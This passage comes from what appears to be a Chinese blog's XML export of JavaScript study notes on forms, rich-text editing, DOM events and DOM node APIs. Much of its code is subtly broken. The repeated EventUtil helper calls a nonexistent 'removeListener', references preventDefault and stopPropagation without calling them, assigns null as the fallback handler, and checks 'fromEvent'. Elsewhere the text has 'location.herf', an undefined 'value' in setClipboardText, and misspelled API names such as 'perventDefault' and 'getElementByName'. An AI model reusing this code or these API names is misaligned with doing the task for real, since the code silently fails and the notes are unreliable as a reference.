(j = 0, optLen = field.options.length; j &lt; optLen; j++) &#123; option = field.options[j]; if (option.selected) &#123; optValue = ""; if (option.hasAttribute) &#123; optValue = (option.hasAttribute("value") ? option.value : option.text); &#125; else &#123; optValue = (option.attributes["values"].specified ? option.value : option.text); &#125; parts.push(encodeURLComponent(field.name) + "=" + encodeURLComponent(optValue)); &#125; &#125; &#125; break; case undefined: case "file": case "reset": case "submit": case "button": break; case "radio": case "checkbox": if (!field.name.length) &#123; break; &#125; default: if (field.name.length) &#123; parts.push(encodeURLComponent(field.name) + "=" + encodeURLComponent(field.value)); &#125; &#125; &#125; return parts.join("&amp;");&#125; 富文本编辑器1234567&lt;iframe src="blank.html" name="richedit" style="height: 100px; width: 100px;"&gt;&lt;/iframe&gt;&lt;script&gt; EventUtil.addHandler(window, "load", function() &#123; frames["richedit"].document.designMode = "on"; &#125;);&lt;/script&gt;` 给 &lt;iframe&gt; 指定一个简单的 HTML 页面作为其内容来源。 12345678&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Blank Page for Rich Text Editing&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 页面中就会有一个类似文本框的可编辑区字段。 使用 contenteditable 属性为页面中的某个元素设置 contenteditable 属性，这个元素中的任何文本内容就可以编辑了。 操作富文本与富文本交互的主要方式，使用document.execCommand(); 三个参数：要执行的命令名称、表示浏览器是否应该为当前命令提供用户界面的一个布尔值和执行命令必须的一个值，第二个参数应始终设为 false。下面就是支持的命令。 backcolor bold createlink cut delete fontname forecolor formatblock indent inserthorizontalrule insertimage insertorderedlist insertunorderedlist insertparagraph italic justfycenter outdent paste removeformat selectall unlink 富文本选区使用框架的 getSelection() 方法，可以确定实际选择的文本，该方法返回当前选择文本的 Selection 对象。有以下属性： anchorNode: 选区起点所在起点 anchorOffset focusNode focusOffset isCollapsed rangeCount 方法： addRange(range) collapse(node, offset) collapseToEnd() collapseToStart() containsNode(node) deleteFormDocument() extend(node, offset) getRangeAt(index) removeAllRanges() selectAllChildren(node) toString() 表单和富文本富文本不会自动提交，需要手动创建表单和富文本的关系。 12345EventUtil.addHandler(form, "submit", function (event) &#123; event = EventUtil.getEvent(event); var target = EventUtil.getTarget(event); target.elements["comments"].value = frames["richedit"].document.body.innerHTML;&#125;);]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>表单</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js的事件]]></title>
    <url>%2F2015%2F10%2F28%2Fjs%E7%9A%84%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[JavaScript 与 HTML 之间的交互是通过 事件 实现的。事件三要素: 事件源.事件 = function(){ 事件处理程序 }；等价于 &lt;标签 事件= “事件处理程序”&gt;。 事件就是文档或浏览器窗口中发生的一些特定交互瞬间。包括事件类型、事件目标、事件处理程序、事件对象。 事件类型是用过用来说明发生什么类型事件的字符串。 事件目标是发生的事件或与之相关的对象。如 window、Document、Element 对象。以及由 XMLHTTPRequest 对象。 事件处理程序或事件监听程序是处理或响应事件的函数。 事件对象是与特定事件相关且包含有关该事件的详细信息的对象。 事件传播是浏览器决定哪个对象触发其事件处理程序的过程。当文档元素上发生某个类型的事件时，它们会在文档树上向上冒泡。 事件传播的另一中形式称为事件捕获，在容器元素上注册的特定处理程序有机会在事件传播到真实目标之前捕获。 事件流事件流描述的是页面中接收事件的顺序。 事件冒泡事件开始是由最具体的元素（文档中嵌套最深的那个节点）接收，然后逐级向上传播到较为不具体的节点。IE、FireFox、Chrome、Safari将事件一直冒泡到 window 上。 事件捕获目的是在事件到达预定目标之前捕获它。不太具体的节点最先收到事件，而最具体的节点应该最后收到事件。 DOM 事件流事件流的三个阶段： 事件捕获阶段 处于目标阶段 事件冒泡阶段 在 DOM 事件流中，实际目标在捕获阶段不会接收到事件。下一个阶段是”处于目标阶段”，事件在目标上发生，并在事件处理中看成是冒泡阶段的一部分。然后，冒泡阶段发生。 事件处理程序HTML 事件处理程序123456789&lt;input type="button" name="butt1" value="点我" onclick="console.log('我被点击了')"&gt;&lt;input type="button" name="butt2" value="点我" onclick="showMsg()"&gt;&lt;script type="text/javascript"&gt; function showMsg() &#123; console.log('被点了'); &#125;&lt;/script&gt;&lt;input type="button" name="butt3" value="点我" onclick="console.log(event.type)"&gt;&lt;input type="button" name="butt4" value="点我" onclick="console.log(this.value)"&gt; event 变量可以直接访问事件对象。this 指的是触发事件的当前元素。 HTML 指定事件处理程序的缺点是：HTML 和 JavaScript 代码紧密耦合。 DOM0 级事件处理程序将一个函数赋值给一个事件处理程序属性。优点：简单、跨浏览器的优势。 1234var btn = document.getElementById("btn");btn.onclick = function() &#123; console.log("我被点击了");&#125; DOM2 级事件处理程序定义了两个指定和删除事件处理程序的操作： addEventListener() 和 removeEventListener()；接收 3 个参数： 要处理的事件名 作为事件处理程序的函数 一个布尔值：true 时表示在捕获阶段调用事件处理程序，false 表示在冒泡阶段调用事件处理程序。 IE 的事件处理程序 attachEvent() detachEvent() 均接收两个参数，事件处理程序名称和事件处理程序函数。通过 attachEvent 添加的事件处理程序都会被添加到事件冒泡阶段。 跨浏览器的事件处理程序封装一个兼容的事件处理程序，参数是：要操作的元素、事件类型、事件处理程序。 1234567891011121314151617181920var EventUtil = &#123; addHandler: function(element, type, handler) &#123; if (element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = null; &#125; &#125;, removeHandler: function(element, type, handler) &#123; if (element.removeListener) &#123; element.removeListener(type, handler, false); &#125; else if (element.detachEvent) &#123; element.detachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = null; &#125; &#125;&#125; 事件对象在触发 DOM 上的某个事件时，会产生一个事件对象 event，这个对象中包含着所有与事件相关的信息。包括： 导致事件的元素 事件类型 事件相关信息 DOM 中的事件对象兼容 DOM 浏览器会将一个 event 对象传入到事件处理程序中。可以通过事件处理程序拿到 event 对象的信息。 1234567var btn = document.getElementById("btn");btn.onclick = function(event) &#123; console.log(event.type); // "click"&#125;btn.addEventlistener("click", function(event)&#123; console.log(event.type); // "click"&#125;, false); 在通过 HTML 特性指定的事件处理程序，变量 event 保存着 event 对象。 1&lt;input type="button" name="btn" value="点我" onclick="console.log(event.type)" /&gt; event 对象包含与创建它的特定事件有关的属性和方法。触发的事件不同，可用的属性和方法也不一样。但所有事件都会有下表中列出的方法。 | 属性/方法 | 类型 | 读/写 | 说明 || bubbles | Boolean | 只读 | 表明是否冒泡 || cancelable | Boolean | 只读 | 是否可以取消事件的默认行为 || currentTarget | Element | 只读 | 事件处理程序当前正在处理事件的那个元素 || defaultPrevented | Boolean | 只读 | true 时表示调用了 perventDefault() || detail | Integer | 只读 | 事件相关的细节信息 || eventPhase | Integer | 只读 | 调用事件处理程序的阶段：1捕获 2处于目标 3冒泡 || perventDefault() | Function | 只读 | 取消事件默认行为，如果candelable是true可以使用这个方法 || stopImmediatePropagation() | Function | 只读 | 取消事件的进一步捕获或冒泡，同时阻止任何事件处理程序调用 || stopPropagation() | Function | 只读 | 取消事件的进一步捕获或冒泡，如果 bubbles 为 true，则可以使用这个方法 || target | Element | 只读 | 事件目标 || trusted | Boolean | 只读 | 为 true 时表示浏览器生成的，为 false 时表示开发人员通过 javascript 创建的 || type | String | 只读 | 被触发的事件类型 || view | AbstractView | 只读 | 与事件相关联的抽象视图。等同于发生事件的 window 对象 | 在事件处理程序的内部，this 始终等于 currentTarget 的值，而 target 只包含事件的实际目标。如果时间处理程序指定给了目标元素。则这三个的值相等。 stopPropagation() 方法用于立即停止事件在 DOM 层次中的传播，即取消进一步的事件捕获或冒泡。 IE 中的事件对象event 对象作为 window 对象的一个属性存在。 | 属性/方法 | 类型 | 读/写 | 说明 || cancelables | Boolean | 读/写 | 默认值是 false，设置为 true 就可以取消事件冒泡 || returnValue | Boolean | 读/写 | 默认 true，设为 false 可以取消事件的默认行为 || srcElement | Element | 只读 | 事件的目标 || type | String | 只读 | 被触发的事件类型 | 跨浏览器的事件对象12345678910111213141516171819202122232425262728293031323334353637383940var EventUtil = &#123; addHandler: function(element, type, handler) &#123; if (element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = null; &#125; &#125;, removeHandler: function(element, type, handler) &#123; if (element.removeListener) &#123; element.removeListener(type, handler, false); &#125; else if (element.detachEvent) &#123; element.detachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = null; &#125; &#125;, getEvent: function(event) &#123; return event ? event : window.event; &#125;, getTarget: function(event) &#123; return event.target || event.srcElement; &#125;, preventDefault: function(event) &#123; if (event.preventDefault) &#123; event.preventDefault; &#125; else &#123; event.returnValue = false; &#125; &#125;, stopPropagation: function(event) &#123; if (event.stopPropagation) &#123; event.stopPropagation; &#125; else &#123; event.cancelBubble = true; &#125; &#125;&#125; 事件类型 UI 事件：用户与页面上的元素交互时触发； 焦点事件：元素获取焦点或失去焦点时触发 鼠标事件 滚轮事件 文本事件 键盘事件 合成事件 变动事件：底层 DOM 结构发生变化时触发 UI 事件 DOMActive 已废弃 load: 页面完全加载后在 window 上触发 unload：页面卸载后在 window 上触发 abort：在用户停止下载过程时，如果嵌入的元素没有加载完，则在目标元素上面触发 select：当用户选择文本框中的一个或多个时触发 resize：当窗口或框架的大小变化时触发 scroll：当用户滚动带滚动条的元素中的内容时在该元素上触发。 焦点事件 blur：元素失去焦点时触发；这个事件不会冒泡。 DOMFocusIn：在元素获取焦点时触发。与 HTML 事件的 focus 等价。只有 Opera 支持。DOM3 级已废弃，选择了 focusin。 DOMFocusOut：在元素失去焦点时触发。DOM3 级已废弃，选择了 focusout。 focus: 获取焦点时触发。 focusin：它冒泡，和 HTML 的 focus 事件等价。 focusout：它冒泡，是 HTML 的 blur 事件的通用版本。 鼠标与滚轮事件 click：用户单击鼠标按钮（一般是左键）或者按下 Enter 键时触发。 dbclick：双击鼠标触发。不能通过键盘触发这个事件。 mousedown：按下了鼠标任意键触发。不能通过键盘触发这个事件。 mouseenter：在鼠标光标从元素外部首次移动到元素范围之内时触发。这个事件不冒泡，而且在光标移动到后代元素上不会触发。 mouseleave：在位于元素上方的鼠标光标移动到元素范围之外时触发。这个事件不冒泡，而且在光标移动到后代元素上不会触发。 mouseenter 和 mouseleave 是一对，IE、FireFox 9+ 和 Opera 支持这个事件。 mousemove：鼠标指针在元素内部移动时重复触发。 mouseout：在鼠标指针位于一个元素上，然后用户将其移入另一个元素时触发。 mouseover：在鼠标指针位于一个元素外部，然后用户将其首次移入另一元素边界之内时触发 mouseup：鼠标抬起时触发。 滚轮事件 mousewheel 事件 12// 检查浏览器是否支持上面所有的事件var isSupported = document.implementation.hasFeature("MouseEvent", "3.0"); 客户区坐标位置 event.clientX 事件发生时鼠标指针在视口中的位置 event.clientY 事件发生时鼠标指针在视口中的位置 屏幕坐标位置 event.screenX 相对于整个电脑屏幕的坐标位置 event.screenY 相对于整个电脑屏幕的坐标位置 键 shiftKey ctrlKey altKey metaKey 相关元素发生 mouseover 和 mouseout 时，还会涉及更多的元素。 DOM 通过 event 对象的 relatedTarget 属性提供了相关元素信息。在 mouseover 事件触发时， IE 的 fromElement 保存了相关元素，在 mouseout 事件触发时，IE 的 toElement 保存了相关元素。 12345678910111213var EventUtill = &#123; getRelatedTarget: function(event) &#123; if (event.relatedTarget) &#123; return event.relatedTarget; &#125; else if (event.toElement) &#123; return event.toElement; &#125; else if (event.fromEvent) &#123; return event.fromEvent; &#125; else &#123; return null; &#125; &#125;&#125; 更多事件信息DOM2 级事件规范在 event 对象提供了 detail 属性，用于给出有关事件的更多信息。包含了一个数值表示单击了多少次。 altLeft ctrlLeft shiftLeft offsetX offsetY 键盘和文件属性 keydown：按下键盘上的任意键触发 keypress：按下键盘上的字符键触发 keyup：释放键盘上的键时触发 键码 event.keyCode textInput 事件 textInput 事件 event.data 属性的值是用户输入的字符。 event.inputMethod 属性表示把文本输入到文本框的方式 复合事件 compositionstart compositionupdate compositionend 变动事件 DOMSubtreeModified DOMNodeInserted DOMNodeRemoved DOMNodeInsertedIntoDocuemnt DOMNodeRemovedFromDocuemnt DOMAttrModified DOMCharacterDataModified HTML5 事件 contexmenu 事件 beforeunload 事件 DOMContentLoaded 事件 readystatechange 事件 uninitialized 对象尚未初始化 loading 对象正在加载 loaded 对象加载数据完成 interactive 可以操作对象了，但还没有完全加载 complete 对象已经加载完毕 pageshow 和 pagehide 事件 hashchange 事件 设备事件 orientationonchange 事件 MozOrientation 事件 deviceorientation 事件 设备在空间中朝向哪里 alpha 属性 beta 属性 gamma 属性 absolute 属性 compassCalibrated 属性+devicemotion 事件 触摸与手势事件 touchstart：手势在触摸屏时触发 touchmove：手势在屏幕上滑动时触发 touchend：手势离开触摸屏时触发 touchcansel：当系统停止跟踪触摸时触发 touches：表示当前跟踪的触摸操作的 Touch 对象的数组 targetTouches：特定于事件目标的 Touch 对象的数组 changeTouches：表示自上次触摸以来发生了什么改变 Touch 对象的数组 每个 touch 对象包含以下属性 clientX clientY identitier pageX pageY screenX screenY target 内存和性能JavaScript 中，添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能。 事件委托对事件处理程序过多的问题的解决方法就是 事件委托 。事件委托就是利用了事件冒泡，只指定一个事件处理程序来管理某一类型的的所有事件。 12345&lt;ul id="ulBox"&gt; &lt;li id="li1"&gt;1&lt;/li&gt; &lt;li id="li2"&gt;2&lt;/li&gt; &lt;li id="li3"&gt;3&lt;/li&gt;&lt;/ul&gt; 委托事件 12345678910111213141516var ul = document.getElementById("ulBox");EventUtil.addHandler(ul, "click", function(event) &#123; event = EventUtil.getEvent(event); var target = EventUtil.getTarget(event); switch (target.id) &#123; case "li1": document.title = "I changed"; break; case "li2": location.herf = "http://www.baidu.com"; break; case "li3": console.log("Hi"); break; &#125;&#125;); 移除事件处理程序1btn.onclick = null; 禁止a标签的默认行为1onclick = "return false;" 一个判断客户端是 PC 端还是移动端的程序123456789101112131415document.getElementById("txt").onkeydown=function (e) &#123; console.log(e.keyCode); &#125;;window.onresize=function () &#123; if (document.body.clientWidth&gt;960) &#123; console.log("您用的是电脑浏览的该页面"); &#125;else if(document.body.clientWidth&gt;500)&#123; console.log("您用的是平板浏览的该页面"); &#125;else&#123; console.log("您用的是手机浏览的页面"); &#125; &#125;&#125;; // 判断浏览器窗口大小document.onclick=function (e) &#123; document.title = e.screenX+"==="+e.screenY; //screenX和screenY是相对于屏幕的左上角 console.log(e);&#125;; 图片跟着鼠标飞123456789document.onmousemove=function (e) &#123; e=e||window.event; // 兼容代码 document.title=e.clientX+"==="+e.clientY; // clientX和clientY----事件参数获取 imgObj.style.position="absolute"; imgObj.style.left=e.clientX+"px"; imgObj.style.top=e.clientY+"px"; imgObj.style.left=e.pageX+"px"; //pageX--包含可视区域的横坐标和隐藏区域 imgObj.style.top=e.pageY+"px"; //pageY---包含可视区域的纵坐标和隐藏区域&#125;； 模拟多人开发注册事件12345678910111213function addEvent(element, eventName, fn) &#123; var oldEvent=element["on"+eventName]; if(oldEvent==null)&#123;//表示该事件没有处理函数 element["on"+eventName]=fn;//注册事件了 &#125;else&#123; //有事件了---先调用原来的事件,再重新注册新的事件 element["on"+eventName]=function () &#123; //调用原来的事件-注册新的事件 oldEvent(); fn(); &#125;; &#125;&#125; 注册多个事件 三种注册事件的方式: 对象.on事件名字=事件处理函数; 对象.addEventListener(“事件的名字”,事件处理函数,false); 对象.attachEvent(“on事件的名字”,事件处理函数); 注册事件方式的区别: btnObj.onclick=fn;这种方式任何浏览器都支持 btnObj.addEventListener();谷歌和火狐浏览器支持 btnObj.attachEvent();IE8支持 同一个元素同时注册多个相同的事件，addEventListener和attachEvent区别: 前者三个参数,后者两个参数 前者第一个参数是事件的名字，没有on 后者第一个参数是事件的名字,有on addEventListener方法中第三个参数如果是false则是事件冒泡,如果是true则是事件捕获 事件冒泡阶段判断 通过事件参数–e.eventPhase 可以获取当前事件经历的是什么阶段 如果是1则是捕获阶段 如果是2则是目标阶段:第一次点谁谁就是目标 目标阶段之后就是冒泡阶段 以上是结合第三个参数是false的情况而言 另一种情况:第三个参数是true的时候,只有捕获阶段和目标阶段 先捕获,然后再目标 一般网页中都是有事件冒泡的,一般情况我们不用捕获 阻止事件冒泡两种方式: 第一种:方法 e.stopPropagation(); 第二种:属性 window.event.cancelBubble=true; 有关事件处理的函数的封装12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576var EventUtil = &#123; addHandler: function(element, type, handler) &#123; if (element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = null; &#125; &#125;, removeHandler: function(element, type, handler) &#123; if (element.removeListener) &#123; element.removeListener(type, handler, false); &#125; else if (element.detachEvent) &#123; element.detachEvent("on" + type, handler); &#125; else &#123; element["on" + type] = null; &#125; &#125;, getEvent: function(event) &#123; return event ? event : window.event; &#125;, getTarget: function(event) &#123; return event.target || event.srcElement; &#125;, preventDefault: function(event) &#123; if (event.preventDefault) &#123; event.preventDefault; &#125; else &#123; event.returnValue = false; &#125; &#125;, stopPropagation: function(event) &#123; if (event.stopPropagation) &#123; event.stopPropagation; &#125; else &#123; event.cancelBubble = true; &#125; &#125;, getRelatedTarget: function(event) &#123; if (event.relatedTarget) &#123; return event.relatedTarget; &#125; else if (event.toElement) &#123; return event.toElement; &#125; else if (event.fromEvent) &#123; return event.fromEvent; &#125; else &#123; return null; &#125; &#125;, getWheelDelta: function(event) &#123; if (event.wheelDelta) &#123; return (client.engine.opera &amp;&amp; client.engine.opera &lt; 9.5 ? -event.wheelDelta : event.wheelDelta); &#125; else &#123; return -event.detail * 40; &#125; &#125;, getCharCode: function(event) &#123; if (typeof event.charCode == "number") &#123; return event.charCode; &#125; else &#123; return event.keyCode; &#125; &#125;, getClipboardText: function(event) &#123; var clipboardData = (event.clipboardData || window.clipboardData); return clipboardData.getData("text"); &#125;, setClipboardText: function(event) &#123; if (event.clipboardData) &#123; return event.clipboardData.setData("text/plain", value); &#125; else if (window.clipboardData) &#123; return window.clipboardData.setData("text/plain", value); &#125; &#125;&#125; 动画函数封装（js）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273//根据id获取对应的元素function my$(id) &#123; return document.getElementById(id);&#125;/** element---任意的元素* attr---属性* */function getAttrValue(element,attr) &#123; return element.currentStyle ? element.currentStyle[attr] : window.getComputedStyle(element,null)[attr]||0;&#125;/** element----要移动的元素* target----移动的目标* 初级版本* */function animate1(element,target) &#123; clearInterval(element.timeId); element.timeId=setInterval(function () &#123; //获取当前的位置 var current=element.offsetLeft; //每次移动多少步 var step=(target-current)/10;//(目标-当前)/10 step=step&gt;0?Math.ceil(step):Math.floor(step); current=current+step; element.style.left=current+"px"; if(current==target)&#123; clearInterval(element.timeId); &#125; console.log("target:"+target+"current:"+current+"step:"+step); &#125;,10);&#125;/** 终极版本的动画函数* */function animate(element,json,fn) &#123; clearInterval(element.timeId); element.timeId=setInterval(function () &#123; var flag=true;//假设都达到了目标 for(var attr in json)&#123; if(attr=="opacity")&#123;//判断属性是不是opacity var current= getAttrValue(element,attr)*100; //每次移动多少步 var target=json[attr]*100;//直接赋值给一个变量,后面的代码都不用改 var step=(target-current)/10;//(目标-当前)/10 step=step&gt;0?Math.ceil(step):Math.floor(step); current=current+step; element.style[attr]=current/100; &#125;else if(attr=="zIndex")&#123;//判断属性是不是zIndex element.style[attr]=json[attr]; &#125;else&#123;//普通的属性 //获取当前的位置----getAttrValue(element,attr)获取的是字符串类型 var current= parseInt(getAttrValue(element,attr))||0; //每次移动多少步 var target=json[attr];//直接赋值给一个变量,后面的代码都不用改 var step=(target-current)/10;//(目标-当前)/10 step=step&gt;0?Math.ceil(step):Math.floor(step); current=current+step; element.style[attr]=current+"px"; &#125; if(current!=target)&#123; flag=false;//如果没到目标结果就为false &#125; &#125; if(flag)&#123;//结果为true clearInterval(element.timeId); if(fn)&#123;//如果用户传入了回调的函数 fn(); //就直接的调用, &#125; &#125; console.log("target:"+target+"current:"+current+"step:"+step); &#125;,10);&#125; 总结三大系列123clientX clientY clientWidth clientHeightpageX pageY pageWidth pageHeightoffsetLeft offsetTop offsetWidth offsetHeight]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>事件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DOM-文档对象模型]]></title>
    <url>%2F2015%2F10%2F08%2FDOM-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[DOM 是针对 HTML 和 XML 文档的一个 API。 DOM 描绘了一个层次化的节点树。 HTML 文档的树形结构包含表示 HTML 标签或元素和表示文本字符串的节点，它也可能包括表示 HTML 注释节点。 DOM基本概念DOM 描述 DOM Document Object Model 文档对象模型 就是把HTML文档模型化，当作对象来处理 DOM提供的一系列属性和方法可以视作一个工具箱，极大地方便了我们对文档的处理。 内容概念 文档(Document)：就是指HTML或者XML文件 节点(Node)：HTML文档中的所有内容都可以称之为节点，常见的节点有 元素节点 属性节点 文本节点 注释节点 元素(Element) HTML文档中的标签可以称为元素 结构概念 父节点 当前节点的父级 子节点 当前节点的子级 兄弟节点 和当前节点同属一个父级的节点 节点类型DOM1 级定义了一个 Node 接口，该接口由 DOM 中的所有节点类型实现。这个 Node 接口在 JavaScript 中是作为 Node 类型事项的。JavaScript 中的所有节点类型都继承自 Node 类型。每个节点有一个 NodeType 属性，用于表明节点的类型。节点类型由在 Node 类型中定义的 12 个常量来表示： Node.ELEMENT_NODE(1); 表示元素节点 Node.ATTRIBUTE_NODE(2); 表示属性节点 Node.TEXT_NODE(3); 表示文本节点 Node.CDATA_SECTION_NODE(4); Node.ENTITY_REFERENCE_NODE(5); Node.ENTITY_NODE(6); Node.PROCESSING_INSTRUCTION_NODE(7); Node.COMMENT_NODE(8); 表示文本节点 Node.DOCUMENT_NODE(9); Document 节点 Node.DOCUMENT_TYPE_NODE(10); Node.DOCUMENT_FRAGEMENT_NODE(11); DocumentFragment 是特殊的节点，作为其它节点的一个容器。 Node.NOTATION_NODE(12); someNode.nodeType 兼容所有浏览器，IE 没有公开 Node 类型的构造函数。 nodeName 和 nodeValue这两个属性了解节点的具体信息，对于节点类型为 1 的元素节点，nodeName 中保存的是元素标签名，nodeType 的值始终是 null。 节点关系作为元素树的文档节点 firstChild 指向 childNodes 列表中的第一个元素 lastChild 指向 childNodes 列表中的最后一个元素 childNodes 每个节点都有 childNodes 属性，保存了 NodeList 类数组对象。 NodeList 是有生命、有呼吸的对象，DOM 结构的变化能够自动反映在 NodeList 对象中。 下面代码将 NodeList 对象转成真正的数组。 123456789101112function convertToArray(nodes) &#123; var array = null; try &#123; array = Array.prototype.slice.call(nodes, 0); // 针对非 IE 浏览器 &#125; catch (e) &#123; array = new Array(); for (var i = 0, len = nodes.length; i &lt; len; i++) &#123; array.push(nodes[i]); &#125; &#125; return array;&#125; parentNode 每个节点都有 parentNode 属性，指向文档树的根节点。 previousSibling 上一个同胞节点 nextSibling 下一个同胞节点 作为元素树的文档 firstElementChild 第一个子元素 有兼容性问题 lastElementChild 最后一个子元素 有兼容性问题 children 子元素 虽然不是早期DOM标准中的方法，但是所有浏览器都支持。 childElemntCount 子元素的数量。返回值和 childre.length 相等。 previousElementSibling 上一个兄弟元素 有兼容性问题 nextElementSibling 下一个兄弟元素 有兼容性问题 haschildNodes() 方法在节点包含一个或多个子节点的情况下返回 true。 操作节点 appendChild() 向 childNodes 列表的末尾添加一个节点。 添加节点后，childNodes 的新增节点、父节点以及以前的最后一个子节点的关系指针都会相应地得到更新。返回新增的节点。 如果传入的节点已经是文档的一部分了，那么就将该节点从原来的位置移动到新位置。 insertBefore() 接收两个参数：要插入的节点和作为参照的节点。 插入节点后，被插入的节点会变成参照节点的前一个同胞节点，同时被方法返回。 如果参照节点是空，则该方法和 appendChild() 执行相同的操作。 replaceChild() 接收两个参数：要插入的节点，要替换的节点。 要替换的节点被该方法返回，从文档树种移除，该节点所占位置被新的节点代替 removeChild() 接收一个参数，即要被移除的节点，返回这个节点。 以上几个方法是有父节点的子节点才具有的。下面两个方法所有类型的节点都有的。 cloneNode() 用于创建调用该方法的节点完全相同的节点。 该方法接收一个布尔值，表示是否深度克隆 参数为 true 时，克隆调用该方法的节点及其整个子节点树 参数为 false 时，只复制节点本身。 复制后返回的节点副本属于文档所有，但并没有为它指定父节点。 使用上面的 appendChild()、insertBefore()、replaceChild()方法添加的文档中。 normalize() 唯一作用是处理文档树中的文本节点。 调用该方法的节点，在其后代节点中查找空文本节点并删除。如果找到相邻文本节点，则合并 Document 类型在浏览器中，document 对象是 HTMLDocument (继承自 Document) 的一个实例，表示整个 HTML 页面。 特点： nodeType 为 9 nodeName 为 “#document” nodeValue 为 “null” parentNode 为 “null” ownerDocument 为 “null” 子节点可能是 DocumentType(最多一个)、Element(最多一个)、Comment、ProcessingInstruction。 文档子节点 documentElement 属性 内置的访问子节点的方式 document.documentElement ， 返回值和 childNodes[0]、firstChlid 的值相同。 body 属性 直接指向 body 元素。 documentElement 和 body 属性所有浏览器都支持。 doctype 属性 IE8 以及之前的版本，如果存在文档声明，会错误的解释为 一个助手并当做 Comment 节点。返回 null。 IE9+ 以及 FF，如果存在文档声明，会将其作为文档的第一个子节点；document.doctype 是一个 DocmentType 节点。会出现在 document.childNodes 中。 Safari、Chrome 和 Opera，如果存在文档声明，将其解析，不作为文档的子节点。document.doctype 是一个 DocmentType 节点。不会出现在 document.childNodes 中。 浏览器对处理位于 &lt;html&gt; 外部的注释节点，也有差异 文档信息 document.title 获取 标签中的内容 网页请求相关的属性 document.URL 包含网页完整的 URL document.domain 包含页面的域名 document.referrer 保存着链接到当前页面的那个页面的 URL。 所有的这些信息保存在请求的 HTTP 头部。以上三个属性中只有 domain 属性是可以设置的。 当页面中包含来自其它子域的框架或者内嵌框架时候，能够设置 document.domain 就非常方便。由于跨域安全限制，来自不通子域的页面无法通过 JavaScript 通信。而通过将每个页面的 document.domain 设置为相同的值，这些页面就可以听歌互相访问对方包含的 JavaScript 对象了。 获取元素 getElementById(); 该方法只能被document对象调用； 该方法接收一个参数，要获取元素的 ID ； 如果找到返回该 DOM 元素，否则返回 null。 IE7 以及较低版本会将表单元素 name 值为该方法中的 id 相同的元素返回。 getElementsByTagName(); 该方法接收一个参数，标签名。还可以传入 “*”，表示获取文档中的所有元素。 通过标签名寻找一类元素（找到的是由元素对象组成的伪数组）。返回的是一个 HTMLCollection。 即可以被 document 调用，又可以被元素对象调用。 被元素对象调用时表示在该元素对象内部执行查找。 getElementByName(); 只有 HTMLDocument 才有的方法。 返回带有给定 name 特性的所有元素。最常用于取得单选按钮。 可以使用方括号或者 item() 来访问 HTMLCollection 集合中的项。该对象还有一个 nameItem() 方法，可以通过元素的 name 特性取得集合中的项。 特殊集合 document.anchors 返回包含页面中所有带 name 特性的 &lt;a&gt;元素 document.applets 包含文档中所有的 &lt;applet&gt; 元素，这个已经不用了。 document.froms 包含文档中的所有的 &lt;form&gt; 元素。 document.images 包含文档中的所有的 &lt;img&gt; 元素。 document.links 包含文档中的所有带 herf 的 &lt;a&gt; 元素。 DOM 的一致性检测 document.implementation 属性 该属性有个 hasFeature() 方法，接收两个参数： 要检测的 DOM 功能的名称 要检测的 DOM 功能的版本号 文档写入将输出流写入到网页中。可以使用这些方法动态的给网页中添加内容。 document.write() 接收要写到输出流的文本 document.writeln() 接收要写到输出流的文本 document.open() 打开输出流 document.close() 关闭输出流 write() 和 writeln() 方法动态地包含外部资源。使用时不能直接包含字符串&lt;/sript&gt;，而是使用 &lt;\/script&gt; 进行转义。 Element 类型Element 提供了对元素标签名、子节点及其特性的访问。 特点： nodeType 为 1 nodeName 为 元素的标签名 nodeValue 为 “null” parentNode 可能是 Document 或 element 子节点可能是 Element、Text、Comment、ProcessingInstruction、CDATASection 或 EntityReference 要访问元素的标签名可以使用 nodeName 或 tagName 属性。DOM元素.tagName 输出的是大写。 在 HTML 中，标签名始终都是全部以大写标书；而在 XML 或 XHML 中标签名会与源码代码中保持一致。 HTML 元素由 HTMLElement 类型表示。每个 HTML 元素的特性： id 元素在文档中的唯一标识符 title 有关元素的附加说明 lang 元素内容的语言代码，很少用 dir 语言的方向，值为 “ltr” (从左至右) 或 “rtr” (从右至左)，很少用 className，与元素的 class 相对应。 获取属性 getAttribute() 传递的参数与实际的属性名相同。 可以获取自定义属性。 任何元素的所有特性，都可以通过 DOM 元素本身的属性来访问。只有非自定义的属性才会以属性的形式添加到 DOM 对象中。 有两类特殊的属性，虽然有对应的属性名，但是属性的值与通过 getAttribute() 返回的值并不相同。 style, 用于通过 CSS 为元素指定样式； 事件处理程序。通过 getAttribute() 访问会返回相对应的代码字符串。 设置属性 setAttribute() 接收两个参数：要设置的属性名，要设置的值 存在替换，不存在创建 元素对象.属性名 = &quot;属性值&quot;; &lt;标签 属性名=&quot;属性值&quot;&gt; 删除属性 removeAttribute() IE6 之前版本不支持。 attribute 属性该属性有一下几种方法： getNamedItem(name) 返回 nodeName 等于 name 的节点 removeNamedItem(name) 移除 nodeName 等于 name 的节点 setNamedItem(node) 向列表中添加节点 item(pos) 返回位于 pos 处的节点 创建元素 document.createElement() 接收的参数是要创建元素的标签名 HTML 中不区分大小写，XML 或 XHTML 中区分大小写 在 IE 中可以使用为该方法传入完整的元素标签的方式创建。 